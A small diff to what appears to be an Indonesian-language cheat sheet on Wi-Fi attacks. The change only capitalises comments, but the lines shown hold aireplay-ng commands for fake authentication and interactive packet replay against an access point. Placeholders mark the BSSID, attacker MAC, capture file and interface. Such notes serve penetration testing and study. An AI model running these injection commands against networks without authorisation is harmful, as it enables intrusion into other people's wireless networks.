@@ -19,13 +19,13 @@ sudo aireplay-ng -1 <delay> -a <bssid> -h <mac_attacker> <interface>
 Serangan Interactive Packet Replay:
 
 ```bash
-# filter berdasarkan BSSID
+# Filter berdasarkan BSSID
 sudo aireplay-ng -2 -b <bssid> <interface>
 
-# filter berdasarkan MAC sumber
+# Filter berdasarkan MAC sumber
 sudo aireplay-ng -2 -h <mac_attacker> <interface>
 
-# replay dari file capture
+# Replay dari file capture
 sudo aireplay-ng -2 -r <file_capture> <interface>
 ```
 
